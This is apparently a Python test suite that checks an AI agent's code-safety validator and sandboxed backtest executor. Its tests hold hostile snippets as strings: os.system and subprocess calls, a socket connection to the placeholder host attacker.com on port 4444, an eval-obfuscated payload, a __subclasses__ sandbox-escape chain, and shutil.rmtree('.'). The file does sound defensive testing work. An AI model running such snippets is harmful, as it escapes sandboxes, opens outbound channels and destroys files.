"""
AlphaAgent Security & Sandboxing Verification Test Suite.
Validates the Zero-Trust Defense-in-Depth layer against adversarial payloads:
1. OS Command Injection
2. Socket Network Egress
3. Subprocess Spawning
4. Dynamic eval/exec Obfuscation
5. Dunder Sandbox Escape
6. Legitimate Backtest Code Execution
7. Executor Integration & Error Handling
"""

import os
import sys

# Ensure root in path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from src.tools.security import validate_code_safety
from src.tools.executor import execute_backtest_code

def test_os_injection_blocked():
    print("[TEST 1/7] Testing OS command injection interception...")
    malicious_code = """
import os
os.system("echo HACKED > hacked.txt")
"""
    result = validate_code_safety(malicious_code)
    assert not result["is_safe"], "Failed: Malicious OS import was not rejected!"
    assert any("os" in v for v in result["violations"]), "Failed: Expected 'os' violation in report."
    print("  -> Passed! Blocked 'import os' and 'os.system()' via AST analysis.")

def test_socket_network_egress_blocked():
    print("[TEST 2/7] Testing socket network egress interception...")
    malicious_code = """
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker.com", 4444))
"""
    result = validate_code_safety(malicious_code)
    assert not result["is_safe"], "Failed: Socket network egress was not rejected!"
    assert any("socket" in v for v in result["violations"]), "Failed: Expected 'socket' violation."
    print("  -> Passed! Blocked 'import socket' via AST analysis.")

def test_subprocess_spawning_blocked():
    print("[TEST 3/7] Testing subprocess spawning interception...")
    malicious_code = """
import subprocess
subprocess.run(["cmd.exe", "/c", "dir"])
"""
    result = validate_code_safety(malicious_code)
    assert not result["is_safe"], "Failed: Subprocess import was not rejected!"
    assert any("subprocess" in v for v in result["violations"]), "Failed: Expected 'subprocess' violation."
    print("  -> Passed! Blocked 'import subprocess' via AST analysis.")

def test_dynamic_eval_blocked():
    print("[TEST 4/7] Testing dynamic eval/exec obfuscation interception...")
    malicious_code = """
payload = "__import__('os').system('dir')"
eval(payload)
"""
    result = validate_code_safety(malicious_code)
    assert not result["is_safe"], "Failed: eval() call was not rejected!"
    assert any("eval" in v for v in result["violations"]), "Failed: Expected 'eval()' violation."
    print("  -> Passed! Blocked 'eval()' dynamic execution primitive via AST analysis.")

def test_dunder_escape_blocked():
    print("[TEST 5/7] Testing Python dunder reflection escape interception...")
    malicious_code = """
classes = ().__class__.__bases__[0].__subclasses__()
"""
    result = validate_code_safety(malicious_code)
    assert not result["is_safe"], "Failed: Dunder attribute escape was not rejected!"
    assert any("__subclasses__" in v or "__bases__" in v for v in result["violations"]), "Failed: Expected dunder violation."
    print("  -> Passed! Blocked '__subclasses__' and '__bases__' reflection attributes.")

def test_legitimate_code_allowed():
    print("[TEST 6/7] Testing legitimate quantitative backtesting code allowance...")
    legitimate_code = """
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt

data = {'Price': [100, 102, 101, 105, 108]}
df = pd.DataFrame(data)
df['Return'] = df['Price'].pct_change()
mean_ret = float(df['Return'].mean())
"""
    result = validate_code_safety(legitimate_code)
    assert result["is_safe"], f"Failed: Legitimate code was falsely flagged! Violations: {result['violations']}"
    print("  -> Passed! Legitimate pandas/numpy/matplotlib code passed AST security validation.")

def test_executor_sandbox_integration():
    print("[TEST 7/7] Testing executor defense-in-depth pre-flight rejection...")
    malicious_code = "import shutil; shutil.rmtree('.')"
    exec_result = execute_backtest_code(malicious_code)
    assert not exec_result["success"], "Failed: Executor should have failed on malicious code!"
    assert exec_result["execution_mode"] == "ast_rejected", f"Failed: Expected 'ast_rejected' mode, got: {exec_result['execution_mode']}"
    assert "SecurityViolation" in exec_result["error"], "Failed: Expected SecurityViolation error message."
    print("  -> Passed! Executor safely rejected malicious code before file creation or process execution.")

if __name__ == "__main__":
    print("==================================================")
    print("RUNNING ALPHA-AGENT ZERO-TRUST SECURITY TEST SUITE")
    print("==================================================\n")
    test_os_injection_blocked()
    test_socket_network_egress_blocked()
    test_subprocess_spawning_blocked()
    test_dynamic_eval_blocked()
    test_dunder_escape_blocked()
    test_legitimate_code_allowed()
    test_executor_sandbox_integration()
    print("\n==================================================")
    print("ALL 7 ZERO-TRUST SECURITY TESTS PASSED (7/7)!")
    print("==================================================")
